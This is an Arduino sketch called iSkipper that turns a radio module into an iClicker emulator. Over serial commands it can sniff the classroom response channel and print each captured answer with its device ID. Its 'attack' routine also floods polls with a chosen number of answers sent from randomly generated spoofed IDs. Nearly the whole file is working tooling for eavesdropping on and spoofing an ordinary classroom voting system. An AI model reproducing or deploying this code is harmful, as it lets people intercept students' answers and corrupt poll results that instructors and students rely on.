/*
 Name:		iSkipper_Arduino_Sketch_New.ino
 Created:	2019/2/12 2:09:07
 Author:	CSR
*/

#include <iClickerEmulator.h>
#include <RingBufCPP.h>
#include "SerialSymbols.h"
#include <string.h>
#include <assert.h>

/*************************Change These Constants Below To Fit Your Hardware!***************************/
/**/																								/**/
/**/#define IS_RFM69HW true //make true if using w version											/**/
/**/#define IRQ_PIN 3		// Must Be 3 for Arduino Nano											/**/
/**/#define CSN 10			// NSS pin,10 for Arduino Nano											/**/
/**/const uint32_t FIXED_ISKIPPER_ID = 0xCDCDCDCD;//The Fixed ID for emulating a normal iClikcer	/**/
/**/																								/**/
/*************************Change These Constants Above To Fit Your Hardware!***************************/


/*Important Constants*/
#define SERIAL_BAUD_RATE 115200 //Baud rate
#define MAX_BUFFERED_PACKETS 5 //The capability of radio receiving buffer
#define MAX_SERIAL_COMMAND_LENGTH 20 //The max length of the command from serial ports
#define SERIAL_NO_COMMAND_WAIT_TIME 3000 //The time to promote for input if there is no input command
/*End Important Constants*/

//Global Variables
char serialCommand[MAX_SERIAL_COMMAND_LENGTH];
RingBufCPP<iClickerPacket, MAX_BUFFERED_PACKETS> recvBuf;
iClickerEmulator clicker(CSN, IRQ_PIN, digitalPinToInterrupt(IRQ_PIN), IS_RFM69HW);

// the setup function runs once when you press reset or power the board
void setup()
{
	Serial.begin(SERIAL_BAUD_RATE);
	clicker.begin(iClickerChannels::AA);
	uint8_t thisID[4];
	intToByteArray(FIXED_ISKIPPER_ID, thisID);
	while (Serial.read() != OP_COMFIRM_CONNECTION) //Wait until connect
	{
		Serial.println(F("Initialization Complete. Waiting for COM command..."));
		for (uint16_t wait = SERIAL_NO_COMMAND_WAIT_TIME; wait > 0; wait--)
		{
			if (Serial.available() > 0)
				break;
			delay(1);
		}
	}
	/*Connection Response Format:
	*	Connection Established! iSkipper ID:\n
	*	[ACK]\n
	*	[ID]\n
	*/
	Serial.println(F("Connection Established! iSkipper ID:"));
	Serial.println(RES_COMFIRM_CONNECTION);
	char strID[9];
	snprintf(strID, sizeof(strID), "%02X%02X%02X%02X", thisID[0], thisID[1], thisID[2], thisID[3]);
	Serial.println(strID);
}

// the loop function runs over and over again until power down or reset
void loop()
{
	char op = processSerialInput(serialCommand, sizeof(serialCommand));
	switch (op)
	{
	case OP_CAPTURE:
	{
		capture();
		break;
	}
	case OP_SUBMIT:
	{
		break;
	}
	case OP_ANSWER:
	{
		break;
	}
	case OP_CHANGE_CHANNEL:
	{
		changeChannel(serialCommand);
		break;
	}
	case OP_ATTACK:
	{
		attack(serialCommand[0], strtoul(&serialCommand[2], NULL, 10));
		break;
	}
	case OP_REPLACE:
	{
		break;
	}
	case OP_RESET:
	{
		reset();
		break;
	}
	default:
	{
		idle();
		break;
	}
	}

}

void recvPacketHandler(iClickerPacket *recvd)
{
	recvBuf.add(*recvd);
}

static inline void idle()
{
	Serial.println(RES_STANDBY);
	Serial.println(F("No Running Progress, waiting for commands..."));
	for (uint16_t wait = SERIAL_NO_COMMAND_WAIT_TIME; wait > 0; wait--)
	{
		if (Serial.available() > 0)
			break;
		delay(1);
	}
	return;
}

static inline void capture()
{
	/*Start Capturing Response Format:
	*	Start capture\n
	*	[ACK]\n
	*/
	Serial.println(F("Start capture"));
	Serial.println(RES_SUCCESS);

	const char reponseFormat[] = "Captured,%c,%02X%02X%02X%02X\n"; //Reponse Format
	iClickerPacket r;
	const uint8_t* id;
	char ans;
	char msg[30];
	clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
	while (!shouldStop())
	{
		while (recvBuf.pull(&r))
		{
			id = r.packet.answerPacket.id;
			ans = iClickerEmulator::answerChar(r.packet.answerPacket.answer);
			snprintf(msg, sizeof(msg), reponseFormat, ans, id[0], id[1], id[2], id[3]);
			printf(msg);
		}
	}
	clicker.stopPromiscuous();
	Serial.println(F("End Capture"));
}

static inline void attack(const char cAns, unsigned long count)
{
	/*Command Format:
	*	A,<Answer>,<Counts>/0
	*Start attacking Response Format:
	*	Start Attack\n
	*	[ACK]\n
	*/
	Serial.println(F("Start Attack"));
	Serial.println(RES_SUCCESS);
	iClickerAnswer ans;
	uint8_t id[ICLICKER_ID_LEN];
	for (unsigned long i = 0; i < count && !shouldStop(); i++) 
	{
		if ((cAns >= 'A' && cAns <= 'E') || cAns == 'P')
			ans = clicker.charAnswer(cAns);
		else
			ans = clicker.randomAnswer();
		clicker.randomId(id);
		clicker.submitAnswer(id, ans, false);
		Serial.print(".");
		if (i % 10 == 0)
			Serial.println();
		if (cAns != 'P')
			delay(5); //To make recieved count be accurate.
	}
	Serial.println(F("\nAttack Finished"));
}

static inline void changeChannel(const char* const arguments)
{
	/*Command Format:
	*	c,<Channel>/0
	*/
	clicker.setChannel(getChannelByString(arguments));
	if (arguments[0] > 'D' || arguments[0] < 'A' || arguments[1] > 'D' || arguments[1] < 'A')
	{
		Serial.println(F("Illegal input Channel, set to default AA channel"));
		Serial.println(RES_FAIL);
	}
	else
	{
		Serial.println(RES_SUCCESS);
		Serial.print(F("Successfully change channel to: "));
		Serial.print(arguments[0]);
		Serial.print(arguments[1]);
		Serial.println();
	}
}

/*
*Read input commands from Serial ports
*Here are the command formats:
*		<COMMAND_CHAR>+','+<COMMAND_ARGUMENTS>+'\0'
*Returns the COMMAND_CHAR input command, and store arguments into argument[].
*/
static inline char processSerialInput(char* const argument, const uint16_t size)
{
	if (Serial.available() > 0)
	{
		size_t readLength = Serial.readBytesUntil('\0', argument, size);
		argument[readLength] = '\0';
		char cOperation = argument[0];
		//Shift left
		for (uint8_t i = 0; i < size - 2; i++)
		{
			argument[i] = argument[i + 2];
		}
		return cOperation;
	}
	return OP_INVALID_OPERATION;
}


//Output pointer must point to an array of exactly 4 Byte.
static inline void intToByteArray(const uint32_t input, uint8_t * const output)
{
	output[0] = input >> 24;
	output[1] = input >> 16 & 0xFF;
	output[2] = input >> 8 & 0xFF;
	output[3] = input & 0xFF;
}

//Return the Channel base on the first two chars in string, return AA if illegal input. 
static iClickerChannel getChannelByString(const char *const str)
{
	uint16_t index = (str[0] - 'A') * 4 + (str[1] - 'A'); //Calculate channel index in channels[] array
	if (index > NUM_ICLICKER_CHANNELS - 1 || index < 0)
		return iClickerChannels::channels[0]; //return AA if illegal input
	return iClickerChannels::channels[index];
}

//Check whether there is an OP_STOP recieved
static inline bool shouldStop()
{
	return Serial.read() == OP_STOP;
}

//Reset function jump to address 0, this would not fix problem caused by wild pointers.
static inline void reset()
{
	__asm("jmp 0");
}

//Check validation of fixed id
constexpr static inline bool isValidId(const uint32_t id)
{
	return ((id >> 24) ^ (id >> 16 & 0xFF) ^ (id >> 8 & 0xFF)) == (id & 0xFF);
}
static_assert(isValidId(FIXED_ISKIPPER_ID), "Your FIXED_ISKIPPER_ID is not valid!");
